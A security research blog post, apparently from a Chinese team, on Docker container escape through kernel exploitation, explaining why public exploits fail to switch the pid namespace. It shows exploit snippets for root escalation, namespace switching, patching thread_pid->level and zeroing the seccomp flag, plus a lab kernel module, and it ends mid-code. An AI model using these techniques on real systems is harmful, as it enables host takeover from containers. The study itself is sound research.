---
slug: tiangongarticle030
date: 2024-05-15
title:  Docker 逃逸中被忽略的 pid namespace
author: clingcling
tags: [Docker, namespace]
---


## 一、背景

最近在研究基于内核漏洞进行Docker逃逸的原理，发现漏洞利用中都会使用如下三行代码，用于切换Docker中exp进程的三种namespace：

```c
setns(open("/proc/1/ns/mnt",O_RDONLY),0);
setns(open("/proc/1/ns/pid",O_RDONLY),0);
setns(open("/proc/1/ns/net",O_RDONLY),0);
```

然而实际测试中，发现exp进程的 pid namespace 并未切换成功，具体表现为：

* 通过 `echo $$` 获得的进程号跟执行exp前没有变化
* 通过 `kill -9` 无法终止任何host进程
* 通过 ls -al /proc/\<exp-host-pid\>/ns 查看pid项的值也没有发生变化。

是什么原因导致只有 pid namespace 切换失败？以及如何完成 pid namespace 的逃逸呢？这篇文章中记录了我对这些问题的理解。

<!-- truncate -->

## 二、Docker逃逸历史漏洞及分类

目前公开的Docker逃逸漏洞可以分为三种类型：Docker配置的问题，Docker实现的问题，和Linux内核的问题。

1. Docker配置的问题：主要是由于用户使用Docker时不规范，指定了不安全的启动参数（--privileged），给了不必要的启动权限（SYS_MODULE、SYS_PTRACE、SYS_ADMIN），或者挂载了特殊文件（/var/run/docker.sock），基于此可以轻易实现Docker逃逸。

2. Docker实现的问题：Docker架构中各个组件中可能出现一些漏洞，如：

   * runc中的漏洞：CVE-2019-5736、CVE-2024-21626等；
   * Docker cp/Docker build的漏洞：CVE-2019-14271、CVE-2019-13139等；
   * containerd的漏洞：CVE-2020-15257等。

3. Linux内核的问题：Docker跟host共享同一个系统内核，因此内核中的漏洞也可能被用于容器逃逸。收集了一些用于容器逃逸的漏洞（不一定能用于Docker逃逸，或者即使能用于Docker逃逸也需要满足一些前提条件），如下：

   * 通过传统内核漏洞ROP完成逃逸的有：CVE-2017-7308、CVE-2017-1000112、CVE-2020-14386、CVE-2021-22555、CVE-2022-0185；
   * 通过容器机制漏洞完成逃逸的有：CVE-2018-18955（namespace）、CVE-2022-0492（cgroups）；
   * 通过文件读写类漏洞完成逃逸的有：CVE-2016-5195（DirtyCow）、CVE-2022-0847（DirtyPipe）。

本文基于传统内核漏洞已实现控制流劫持的场景下（通过植入内核ko实现），研究Docker逃逸过程及利用方法，从而加深对Linux内核中容器安全相关机制的理解。

## 三、Docker依赖的内核安全机制

Docker的本质是一个linux用户态进程，它呈现出来的隔离状态依赖于linux内核这个底座提供的几种安全机制 —— capability，namespace，seccomp，apparmor/selinux，cgroups。

* capability：将普通用户和特权用户进一步区分，实现更细粒度的访问控制；
* namespace：资源隔离，使同一namespace中的进程看到相同的系统资源，并且对其他namespace不可见。目前共有8种namespace；
* seccomp：禁止进程调用某些系统调用；
* apparmor/selinux：强制访问控制；
* cgroups：资源限制，限制进程对计算机资源的使用（如CPU、memory、disk I/O、network等）。

### 3.1 查看状态

如何查看当前环境中这些安全机制的状态呢？

在Docker中起一个bash，host上找到它对应的pid号（8089），然后我们可以在系统命令行中观察这些安全机制作用到每个进程的状态。

* **capability**

    查看进程具备哪些capability：

    ```bash
    ➜  ~ cat /proc/8089/status | grep Cap
    CapInh: 0000000000000000
    CapPrm: 00000000a80425fb
    CapEff: 00000000a80425fb
    CapBnd: 00000000a80425fb
    CapAmb: 0000000000000000
    # 通过capsh解析cap
    ➜  ~ capsh --decode=00000000a80425fb
    WARNING: libcap needs an update (cap=40 should have a name).
    0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
    ```

* **namespace**

    查看进程所属的namespace：

    ```bash
    ➜  ~ sudo ls -al /proc/8089/ns/
    [sudo] password for bling: 
    total 0
    dr-x--x--x 2 root root 0 4月  26 14:42 .
    dr-xr-xr-x 9 root root 0 4月  26 14:42 ..
    lrwxrwxrwx 1 root root 0 4月  26 14:47 cgroup -> 'cgroup:[4026531835]'
    lrwxrwxrwx 1 root root 0 4月  26 14:47 ipc -> 'ipc:[4026532705]'
    lrwxrwxrwx 1 root root 0 4月  26 14:47 mnt -> 'mnt:[4026532703]'
    lrwxrwxrwx 1 root root 0 4月  26 14:42 net -> 'net:[4026532707]'
    lrwxrwxrwx 1 root root 0 4月  26 14:47 pid -> 'pid:[4026532706]'
    lrwxrwxrwx 1 root root 0 4月  26 14:47 pid_for_children -> 'pid:[4026532706]'
    lrwxrwxrwx 1 root root 0 4月  26 14:47 time -> 'time:[4026531834]'
    lrwxrwxrwx 1 root root 0 4月  26 14:47 time_for_children -> 'time:[4026531834]'
    lrwxrwxrwx 1 root root 0 4月  26 14:47 user -> 'user:[4026531837]'
    lrwxrwxrwx 1 root root 0 4月  26 14:47 uts -> 'uts:[4026532704]'
    ```

* **seccomp**

    查看进程是否被seccomp限制了系统调用：

    ```bash
    ➜  ~ cat /proc/8089/status | grep Seccomp
    Seccomp: 2
    Seccomp_filters: 1
    ```

    Seccomp字段数字的含义：

    * 为0表示未开启seccomp
    * 为1表示严格模式，只允许进程使用特定的几个系统调用 — sys_read/sys_write/sys_exit
    * 为2表示过滤模式，通过配置文件自定义允许和禁用的系统调用

    显然，本例中进程seccomp是过滤模式。

* **apparmor/selinux**

    这两个机制不是针对某个进程的，而是对整个系统生效。

    查看系统selinux的状态：

    ```bash
    # 三条命令任选其一
    cat /etc/selinux/config
    getenforce
    /usr/sbin/sestatus -v
    ```

    查看系统apparmor的状态：

    ```bash
    # 两条命令任选其一
    cat /sys/module/apparmor/parameters/enabled
    sudo apparmor_status
    ```

* **cgroups**

    查看进程所属的cgroup：

    ```bash
    ➜  ~ cat /proc/8089/cgroup
    13:perf_event:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    12:cpuset:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    11:pids:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    10:blkio:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    9:rdma:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    8:net_cls,net_prio:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    7:freezer:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    6:hugetlb:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    5:misc:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    4:cpu,cpuacct:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    3:memory:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    2:devices:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    1:name=systemd:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    0::/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c
    ```

    如果需要查看或修改资源，可在 `/sys/fs/cgroup/` 目录中进行。

### 3.2 进程角度

上述从用户态查看到的状态，都是从内核中读取到的进程数据。所以，可以通过调试Linux内核进程描述符 task_struct 结构体，查看其中存放的当前进程 capability、namespace 和 seccomp 的信息：

```c
struct task_struct {
    /* ... */
    const struct cred __rcu  *cred;  // 进程capability信息
    /* ... */
    struct nsproxy   *nsproxy;  // 进程namespace空间
    /* ... */
    struct seccomp   seccomp;  // 进程seccomp相关
    /* ... */
}
```

各个结构体内容：

```c
struct cred {
    /* ... */
    kernel_cap_t cap_inheritable; /* caps our children can inherit */
    kernel_cap_t cap_permitted; /* caps we're permitted */
    kernel_cap_t cap_effective; /* caps we can actually use */
    kernel_cap_t cap_bset; /* capability bounding set */
    kernel_cap_t cap_ambient; /* Ambient capability set */
    /* ... */
}

struct nsproxy {
    atomic_t count;
    struct uts_namespace *uts_ns;
    struct ipc_namespace *ipc_ns;
    struct mnt_namespace *mnt_ns;
    struct pid_namespace *pid_ns_for_children;
    struct net       *net_ns;
    struct time_namespace *time_ns;
    struct time_namespace *time_ns_for_children;
    struct cgroup_namespace *cgroup_ns;
};

struct seccomp {
    int mode;
    atomic_t filter_count;
    struct seccomp_filter *filter;
};
```

正常情况下，这些在内核中的数据是安全的，可以很好地实现容器间的隔离。但当存在可被用户态利用的内核漏洞时，通过更改结构体中数据或者替换掉结构体指针，就可以让一个Docker进程变成一个host进程，从而完成逃逸。

在利用内核漏洞进行Docker逃逸时，目前主要考虑突破 capability、namespace和seccomp 三种限制，所以后续内容只涉及这三个方面。

## 四、利用方法发展历史

从公开的文档来看，利用Linux内核漏洞进行Docker逃逸已经有几年的历史了，目前能看到的方法有三种：

| 时间 | 方法 | 条件 |
|----|----|----|
| [20190306](https://web.archive.org/web/20190411052819/https://capsule8.com/blog/practical-container-escape-exercise/) | （ret2usr）改cred + 改`current→fs` | 可关闭SMEP |
| [20190304](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)/[20190808](https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf) | （ret2usr）改cred + 切namespace + setns() | 可关闭SMEP，有CAP_SYS_ADMIN |
| [20210707](https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/writeup.md#escaping-the-container-and-popping-a-root-shell) | （kernel ROP）改cred + 切namespace  + 用户态setns() | 有CAP_SYS_ADMIN |

### 4.1 改进程fs_struct

最初的逃逸方案是基于SMEP已关闭的前提下，ret2usr后：

* `commit_creds(prepare_kernel_cred(0))`提权 —— 改了进程的capability
* `copy_fs_struct()` —— 将host中pid为1的进程其 task_struct->fs 复制一份
* 用上一步的返回值替换 `current->fs` —— 更改文件系统

ret2usr后利用代码片段：

```c
uint64_t pid_offset_ = 0x9c0;
uint64_t parent_offset_ = 0x9d0;
uint64_t fs_offset_ = 0xbf8;    // 需要task_struct中关键成员的偏移值

uint64_t userpid = 34;

static ssize_t set_fs_(void){
    struct task_struct *task_;
    struct task_struct *init_;
    uint32_t pid_ = 0;
    
    void * userkpid = find_get_pid(userpid);  // 需要Docker中进程的pid
    task_ = pid_task(userkpid,PIDTYPE_PID);
    
    init_ = task_;         // 需要循环搜索
    while (pid_ != 1) {        
        init_ = *(struct task_struct **)((char*)init_ + parent_offset_);
        pid_ = *(uint32_t *)((char*)init_ + pid_offset_);
    }
    
    uint64_t(*copy_fs_struct)(uint64_t) = 0xFFFFFFFF813D2F20;       // 需要几个关键函数的地址
    uint64_t g = (*copy_fs_struct)(*(uint64_t*)((char*)init_ + fs_offset_));
    
    *(uint64_t *)((char*)task_ + fs_offset_) = g;   
    
    return 0;
}

void shellcode(){
    commit_creds(prepare_kernel_cred(0));
    set_fs_();
}
```

该方法可以让Docker进程能够以host的root权限任意读写host文件系统，但是无法kill进程，如下图：

 ![](/attachments/2024-05-15-docker-pid-namespace/62998bd5-0e9d-4ea1-8d4a-fbedbe282f45.png)

因为只替换了文件系统，并未改变任何namespace。

### 4.2 改cap+ns v1.0

上一种方法仅达成了读写host文件系统的能力，而Docker中的进程其namespace还在Docker中，不算是完美的逃逸，于是紧接着出现了第二种可以逃逸namespace的方法。

这个方法也是基于关闭SMEP的前提条件下，ret2usr执行提权和切namespace的操作。主要思路是：

* `commit_creds(prepare_kernel_cred(0))`提权 —— 改了进程的capability
* `switch_task_namespaces()` —— 替换Docker中pid为1进程的namespace
* `setns()` —— 将当前进程加入到`/proc` 目录下pid为1进程的namespace中

ret2usr后利用代码片段：

```c
static ssize_t sw_ns_set_ns(void){
    size_t(*find_task_by_vpid)(int) = 0xFFFFFFFF810E6500;  // 需要几个关键函数/数据的地址
    size_t g = (*find_task_by_vpid)(1);
    
    size_t init_nsproxy = 0xFFFFFFFF82E8B000;
    size_t(*switch_task_ns)(size_t, size_t) = 0xFFFFFFFF810EECB0;
    (*switch_task_ns)(g, init_nsproxy); 
    
    size_t(*sys_open_)(size_t, size_t, int, int) = 0xFFFFFFFF81389980; 
    size_t(*sys_setns_)(size_t, size_t) = 0xFFFFFFFF810EEF60;
    
    int fd1 = (*sys_open_)(AT_FDCWD, "/proc/1/ns/mnt", O_RDONLY, 0);
    (*sys_setns_)(fd1, 0);
    
    int fd2 = (*sys_open_)(AT_FDCWD, "/proc/1/ns/pid", O_RDONLY, 0);
    (*sys_setns_)(fd2, 0);
    
    return 0;
}

void shellcode(){
    commit_creds(prepare_kernel_cred(0));
    sw_ns_set_ns();
}
```

这里有两个小插曲：

1. 在无法关闭SMEP的情况下，这段shellcode能否直接在内核中执行？

   如果在内核中以shellcode形式执行该代码，会在执行open()时返回错误码-14（EFAULT）。通过调试定位到错误产生的代码位置在 `do_sys_open() -> do_sys_openat2() -> getname() -> getname_flags() -> strncpy_from_user()` 函数中：

    ![](/attachments/2024-05-15-docker-pid-namespace/595dddf8-fa83-478e-9cc6-09acde951696.png)

   所以，在内核中使用shellcode做以上利用逻辑时，需将sys_open()的第二个字符串参数设置为用户态地址。

2. pid namespace是否切换成功？

   没有切换成功。虽然通过 `ps -ef` 列出host的所有进程，但这只是因为mnt namespace切换成功后可以读取到host 的 `/proc/` 目录中的内容而已。详细分析见后续章节。

### 4.3 改cap+ns v2.0

由于高版本Linux内核镜像中不再存在操作CR4的gadget，也就无法直接通过ROP关闭SMEP，因此上述ret2usr执行逃逸代码的方案失效。

新的利用思路跟上一小节1.0版本基本相同，只是把代码逻辑分成内核和用户态两部分：

* 内核态ROP执行：commit_creds() + switch_task_namespaces()

    ```c
    void shellcode(){
    commit_creds(prepare_kernel_cred(0));
    size_t(*find_task_by_vpid_)(int) = 0xFFFFFFFF810E6500;
    size_t g = (*find_task_by_vpid_)(1);
    
    size_t init_nsproxy = 0xFFFFFFFF82E8B000;
    size_t(*switch_task_ns_)(size_t, size_t) = 0xFFFFFFFF810EECB0;
    (*switch_task_ns_)(g, init_nsproxy); 
    }
    ```

* 返回用户态后执行：setns()

    ```c
    int main(){
        
        /* ... after return from kernel... */
        
    int ret = 0;
        int fd_mnt, fd_pid, fd_net;
        
    fd_mnt = open("/proc/1/ns/mnt", O_RDONLY);
    printf("fd_mnt: %d , errno: %d \n",fd_mnt, errno);
        ret = setns(fd_mnt, 0);
    printf("mnt ret: %d , errno: %d \n", ret, errno);
    
    errno = 0;
    fd_pid = open("/proc/1/ns/pid", O_RDONLY);
    printf("fd_pid: %d , errno: %d \n",fd_pid, errno);
        ret = setns(fd_pid, 0);
    printf("pid ret: %d , errno: %d \n", ret, errno);
    
    errno = 0;
    fd_net = open("/proc/1/ns/net", O_RDONLY);
    printf("fd_net: %d , errno: %d \n",fd_net, errno);
        ret = setns(fd_net, 0);
    printf("net ret: %d , errno: %d \n", ret, errno);
    
    char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);    
    }
    ```

执行效果如下：

 ![](/attachments/2024-05-15-docker-pid-namespace/4085c621-9cf5-4429-b841-345df81067c7.png)

看上去逃逸成功了？但 `setns(fd_pid, 0);` 这句执行出错并返回错误码22，对应的意思是"Invalid argument"。

假如此时我们尝试kill一个进程，会发现pid namespace依然还在Docker中！无法终止任何host进程。

 ![](/attachments/2024-05-15-docker-pid-namespace/d7760a3b-11f2-4e6a-9878-143c5b877bd6.png)

然后，对比一下当前Docker进程和host中pid为1进程的ns目录，发现mnt和net的值相同，表明二者都切换成功了。但pid的值不相同，说明pid namespace切换失败。这个结果跟上图中 setns() pid 时返回失败能对应上。

 ![](/attachments/2024-05-15-docker-pid-namespace/85151375-1a6c-4705-b3cf-a9290d977766.png)

但是为什么公开的exp中都未提及该问题？因为他们没有检查setns()的返回值，所以没发现这个问题。

 ![](/attachments/2024-05-15-docker-pid-namespace/9fb718d5-1a3a-4307-95d3-2001c892ea14.png)

那么使用 setns() 切换 pid namespace 时报"Invalid argument"这个错误，其背后的原因是什么呢？如何避免该错误的发生从而完成 pid namespace 的切换呢？

### 4.4 被忽略的 pid namespace

**跟踪 sys_setns 过程**

setns() 系统调用在内核中的[入口函数](https://elixir.bootlin.com/linux/v5.15/source/kernel/nsproxy.c#L527)如下：

```c
SYSCALL_DEFINE2(setns, int, fd, int, flags)
{
    struct file *file;
    struct ns_common *ns = NULL;
    struct nsset nsset = {};
    int err = 0;
    /* ... */
    err = prepare_nsset(flags, &nsset);  // 用当前进程的namespace初始化nsset->nsproxy
    /* ... */    
    if (proc_ns_file(file))
        err = validate_ns(&nsset, ns);  // 根据传入的fd更改nsset结构体中的成员
    else
        /* ... */
    if (!err) {
        commit_nsset(&nsset);  // 将当前进程task_struct->nsproxy指向更改过的nsset->nsproxy，从而完成对当前进程namespace的切换
        perf_event_namespaces(current);
    }
    put_nsset(&nsset);
out:
    fput(file);
    return err;
}

static inline int validate_ns(struct nsset *nsset, struct ns_common *ns)
{
    return ns->ops->install(nsset, ns);  
    /* 根据fd的不同进入不同的处理分支：mntns_install()，pidns_install()，netns_install()等，这些函数中会对不同的namespace进行更改 */
}
```

在 `validate_ns(&nsset, ns)` 中有一个函数指针的调用，会根据用户态传入的fd不同而进入不同的处理函数。举例，用户态通过 `open("/proc/1/ns/pid",0)` 获得的fd，调用 `setns(fd, 0)` 进入内核后，会转到 `pidns_install()` 的处理流程。mnt对应mntns_install()、net对应netns_install()，其他ns与之类似。

以 pid namespace 为例，我们看看它是如何通过 setns 系统调用进行切换的，`pidns_install()` 函数处理逻辑如下：

```c
static int pidns_install(struct nsset *nsset, struct ns_common *ns)
{
    struct nsproxy *nsproxy = nsset->nsproxy;
    struct pid_namespace *active = task_active_pid_ns(current);
    struct pid_namespace *ancestor, *new = to_pid_ns(ns);

    if (!ns_capable(new->user_ns, CAP_SYS_ADMIN) ||
        !ns_capable(nsset->cred->user_ns, CAP_SYS_ADMIN))
        return -EPERM;  // 要求当前进程和目标进程的capabilities都具备CAP_SYS_ADMIN

    if (new->level < active->level)  
        return -EINVAL;  // errno 22的原因：不允许子容器切换到父容器的 pid namespace 中
    /* ... */
    nsproxy->pid_ns_for_children = get_pid_ns(new);  // 使用目标进程的pid ns替换掉nsset结构体中的pid_ns_for_children
    return 0;
}
```

通过分析源码可以看到，将Docker进程通过 `setns()` 加入到 `/proc/1/ns/pid` 的namespace时，要求目标进程的 task_struct->thread_pid->level 的值，不小于当前进程的 level 值。而通过调试发现，Docker中exp进程运行到这里时， `new->level` 为0，`active->level` 为1，所以直接返回 errno 22——  "Invalid argument"。

因此，如果想让 `setns(fd_pid, 0);` 返回正常，必须在内核中将当前进程的 `current->thread_pid->level` 改成0。

但是，改完这个值就能切换 pid namespace吗？继续往下看源码发现，即使我们改掉当前进程的level，`setns()` 系统调用中也只会切换 `/proc/$$/ns/pid_ns_for_children`，而不是我们需要的 `/proc/$$/ns/pid`。

所以引出下一个问题：pid namespace 在哪里？

**pid namespace 在哪里？**

新版本内核中，当前进程的 pid namespace 并不在 `task_struct->nsproxy` 指向的 `struct nsproxy` 结构体中。而是存放在另一个结构体 `struct pid` 中 ，`task_struct->thread_pid` 即指向该结构体。

```c
struct task_struct {
    /* ... */
    struct pid   *thread_pid;
    /* ... */
}

struct pid
{
    refcount_t count;   // pid namespace计数
    unsigned int level;   // 进程所在的 pid namespace 层级
    spinlock_t lock;
    /* lists of tasks that use this pid */
    struct hlist_head tasks[PIDTYPE_MAX];
    struct hlist_head inodes;
    /* wait queue for pidfd notifications */
    wait_queue_head_t wait_pidfd;
    struct rcu_head rcu;
    struct upid numbers[1];  // 变长数组，跟count个数对应
};

struct upid {
    int nr;      // 在该namespace中进程的pid值
    struct pid_namespace *ns; // 对应的namespace
};
```

在  `struct pid` 结构体中，目前只需关注 count、level、numbers\[1\] 这三个成员：

* `count`：pid namespace计数，表示可以看到该进程的namespace个数。一个Docker进程，本质上也是host的一个进程，所以一个进程可能存在于多个namespace中，从不同namespace中看到会看到不同的进程信息。比如在Docker中pid为10的进程，在host上它对应pid为3000。
* `level`：表示进程当前所在的层级，host的level为0。当在host上起一个Docker时，Docker进程的level为1。如果在Docker中再起一个Docker，那么新Docker中进程的level为2，以此类推。
* `numbers[1]`：变长的`struct upid`结构体数组，用于存放不同level中该进程的 pid 信息。

所以，该结构体中 level 成员的值表明当前进程在哪个 pid namespace中，只需该掉该值便可完成 pid namespace 的逃逸。

实际测试中，将 level 改完后，再通过 `setns()` 设置 pid namespace，`/proc/$$/ns/pid_ns_for_children` 和 `/proc/$$/ns/pid` 都被更改成功，直接逃到 host 的 pid namespace 中，如下图：

 ![](/attachments/2024-05-15-docker-pid-namespace/7419a223-22f4-4c1a-81ee-0649b4f6c3da.png)

此时可 kill 任意 host 进程：

 ![](/attachments/2024-05-15-docker-pid-namespace/2d652f8b-0d19-4ce4-bcf5-ce91a6964776.png)

所以，逃逸 pid namespace 只需更改进程 `task_struct->thread_pid->level` 的值。

### 4.5 较少被提及的 seccomp

实际上，现在 Docker 的默认启动配置并不存在 CAP_SYS_ADMIN 权限，并且 seccomp 默认规则也会禁止进程调用 `setns()` 来切换 namespace。所以在写内核利用时需考虑绕过这两点的限制，CAP_SYS_ADMIN 可以通过更改进程 `task_struct->cred` 来完成，而 seccomp 的限制应如何绕过呢？

在 CVE-2017-1000112 的 [exp](https://github.com/hikame/docker_escape_pwn/tree/master) 中看到一种绕过seccomp的方法：

 ![](/attachments/2024-05-15-docker-pid-namespace/e74c6ab2-190c-4375-830e-6739c4c06d01.png)

他通过将 task_struct 中 seccomp 结构体中的 mode 和 filter_count 两个成员清零的方式来绕过seccomp。

```c
struct seccomp {
 int mode;
 atomic_t filter_count;
 struct seccomp_filter *filter;
};
```

但是在我的环境中（Linux Kernel 5.15.0），将这两个值清零后，进程会 segmentation fault。所以直接更改这个结构体的内容，显然不可行。那么，除了 `struct seccomp` 结构体可以存放 seccomp 的状态及 filter 规则，有没有类似可以控制 seccomp 的开关呢？

[一些资料](https://keksite.in/posts/Seccomp-Bypass/) 中提供的方法是改进程 `current->thread_info.flags` ，这个 flags 会标记当前进程是否启用seccomp。而在 Linux 5.15.0 环境中，更改进程 `thread_info.flags`，未能关闭seccomp。该版本`struct thread_info` 的定义如下：

```c
struct task_struct {
#ifdef CONFIG_THREAD_INFO_IN_TASK
    struct thread_info  thread_info;
#endif
}

struct thread_info {
    unsigned long  flags;  /* low level flags */
    unsigned long  syscall_work; /* SYSCALL_WORK_ flags */
    u32   status;  /* thread synchronous flags */
};
```

有没有可能标记seccomp的flag位置变了？那这个flag是在何时设置的呢？

于是跟踪 seccomp 系统调用定位 seccomp 开关设置的位置，流程为`do_seccomp() -> seccomp_set_mode_filter()-> seccomp_assign_mode()`  。  

基于此信息，结合 Linux 5.15.0 的内核源码和内核ELF文件定位到该版本设置flags的位置，发现它把 task_struct+8 位置的1个字节写成了1，所以可以确定当前内核版本中 `current->thread_info.syscall_work` 是设置 seccomp 的开关。

 ![](/attachments/2024-05-15-docker-pid-namespace/9cded019-132e-4b55-bce8-f9bbd62cfef8.png)

调试查看开启seccomp和未开启seccomp的进程其 task_struct 结构体，发现确实是偏移 0x8 的位置处存放的值不一样。

 ![](/attachments/2024-05-15-docker-pid-namespace/18a99460-3bde-4113-836a-23e0e5b1dd67.png)

所以只需将该值（`current->thread_info.syscall_work`）设置成0，便可绕过seccomp的限制。

## 五、总结

本文在 `Linux 5.15.0 + Docker 24.0.6` 环境中，基于一个自定义的内核ko，从Linux内核漏洞利用的角度，探索了Docker逃逸需要突破的内核安全机制 —— capability、namespace和seccomp。给出了公开利用中 pid namespace 切换失败的原因及解决方法，以及定位不同系统中进程 seccomp 开关位置的方法。

文末附了详细的环境搭建教程，感兴趣可以搭建调试，如有疑问，欢迎讨论\~

## 六、参考文章

[Docker 逃逸漏洞汇总](https://wiki.teamssix.com/cloudnative/docker/docker-escape-vulnerability-summary.html)

[An Exercise in Practical Container Escapology](https://web.archive.org/web/20190411052819/https://capsule8.com/blog/practical-container-escape-exercise/)

[The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)

[A Compendium of Container Escapes](https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf)

[CVE-2021-22555: Turning \\x00\\x00 into 10000$](https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/writeup.md#escaping-the-container-and-popping-a-root-shell)

[Container security fundamentals part 2: Isolation & namespaces](https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-2/)

[Anatomy of the seccomp](http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/02/04/seccomp)

[PID Namespace](https://sunichi.github.io/2020/07/29/PID-NS/)

[22岁精神小伙居然利用 Linux 内核漏洞实现 Docker 逃逸！！](https://blog.csdn.net/MachineGunJoe/article/details/117777910)

## 七、附：环境搭建

> 基础环境：vmware workstation
>
> 被调试机：ubuntu 20.04虚拟机 + Docker version 24.0.6
>
> 调试机：ubuntu 18.04虚拟机 + gdb

### 7.1 设置调试环境

* 开启vmware虚拟机的调试模式：

    找到 ubuntu20.04 的所在目录，在vmx文件中添加如下两行

    ```plain text
    debugStub.listen.guest64 = "TRUE"
    debugStub.listen.guest64.remote = "TRUE"
    ```

    重启 ubuntu 20.04 这台虚拟机，在 host windows 上可以看到新监听了一个端口 —— 8864。

* 关闭系统KASLR

    ```bash
    su root
    vim /boot/grub/grub.cfg  # 在对应内核的启动项中添加 nokaslr
    reboot
    cat /proc/cmdline   # 重启后，在启动参数中可以看到 nokaslr 字样
    ```

* 为了方便调试，我们还需要获取 ubuntu 20.04 的内核文件，并使用 vmlinux-to-elf 工具恢复部分符号

    操作如下：

    ```bash
    $ uname -a 
    Linux ubuntu2004 5.15.0-102-generic #112~20.04.1-Ubuntu SMP Thu Mar 14 14:28:24 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
    $ su root && cd /home/bling/Desktop/
    # cp /boot/vmlinuz-5.15.0-101-generic ./
    # chown 1000:1000 ./vmlinuz-5.15.0-101-generic
    # exit
    $ chmod 666 ./vmlinuz-5.15.0-101-generic
    $ vmlinux-to-elf ./vmlinuz-5.15.0-101-generic ./vmlinuz-5.15.0-101-generic.elf
    ```

    获得的 vmlinuz-5.15.0-101-generic.elf 文件是我们一会儿 gdb 调试时需要用到的。

* 在调试机 ubuntu18.04 中，通过 gdb 指定 ip 和 port 即可调试 ubuntu 20.04 的内核

    ```bash
    $ gdb
    gef➤  file ./vmlinuz-5.15.0-101-generic.elf  # 提前将上一步的文件拷贝到调试机18.04中
    gef➤  target remote 192.168.133.1:8864
    gef➤  c
    ```

### 7.2 创建Docker

* 写Dockerfile

    ```bash
    mkdir Docker && cd Docker
    vim app.sh
    # #!/bin/bash
    # echo "Hello World!"
    vim Dockerfile
    # FROM ubuntu:18.04
    # COPY ./app.sh /app
    # RUN touch /app/aaa
    # CMD sh /app/app.sh
    ```

* 生成image

    ```bash
    Docker build -t testDocker .
    ```

* 起 Docker shell

    ```bash
    Docker run --rm -it testDocker bash
    ```

### 7.3 编译测试ko

* 检查 `/lib/modules/$(uname -r)/build/` 目录下，是否存在当前内核版本头文件的软件包。没有的话通过 `sudo apt install linux-headers-$(uname -r)` 进行安装。
* 准备好 hello.c 和 Makefile文件，并编译ko

    hello.c 会在dev目录下创建一个设备节点hellodev，用户态通过 `open("/dev/hellodev", 2)` 打开使用。

    hello.c 文件如下：

    ```c
    // hello.c
    #include <linux/module.h>
    #include <linux/init.h>
    #include <linux/proc_fs.h>
    #include <linux/kernel.h>
    #include <linux/uaccess.h>
    #include <linux/slab.h>
    #include <linux/fs.h>
    #include <linux/io.h>
    #include <linux/cdev.h>
    #include <linux/device.h>
    #include <linux/sched.h>
    #include <linux/fcntl.h>
    
    static int test_major = 0;
    static int test_minor = 0;
    
    static struct cdev cdev_0;
    dev_t hellodev_no;
    struct class *hellodev_class;
    
    struct hellodevice{
        char* device_buf;
        uint64_t device_buf_len;
    };
    
    struct hellodevice hellodev_struct;
    
    static int helloopen(struct inode *proc_inode, struct file *proc_file)
    {
        printk(":into open!\n");
        return 0;
    }
    
    static ssize_t helloread(struct file *proc_file, char __user *proc_user, size_t n, loff_t *loff)
    {
        printk(":into read");
    
        char *c = kmalloc(4096, GFP_KERNEL);
        memset(c, 0x41, 4096);
        copy_to_user(proc_user, c, 4096);
    
        return 0;
    }
    
    static ssize_t hellowrite(struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff)
    {
        printk(":into write!\n");
    
        char *c = kmalloc(4096, GFP_KERNEL);
        copy_from_user(c, proc_user, 4096);
    
        return 0;
    }
    
    uint64_t pid__off = 0x9c0;
    uint64_t real_parent_off_ = 0x9d0;
    uint64_t fs_offset_ = 0xbf8;
    
    static ssize_t set_fs_struct_(void){
        struct task_struct *task_;
        struct task_struct *init_;
        uint32_t pid_ = 0;
        uint64_t userpid = 0;   
        
        size_t(*getpid_)(void) = 0xFFFFFFFF810D6380;
        userpid = (*getpid_)(); 
    
        void * userkpid = find_get_pid(userpid);
        task_ = pid_task(userkpid,PIDTYPE_PID);
    
        init_ = task_;
        while (pid_ != 1) {
            init_ = *(struct task_struct **)((char*)init_ + real_parent_off_);
            pid_ = *(uint32_t *)((char*)init_ + pid__off);
        }
    
        uint64_t(*copy_fs_struct)(uint64_t) = 0xFFFFFFFF813D2F20;
        uint64_t g = (*copy_fs_struct)(*(uint64_t*)((char*)init_ + fs_offset_));
        *(uint64_t *)((char*)task_ + fs_offset_) = g;
        
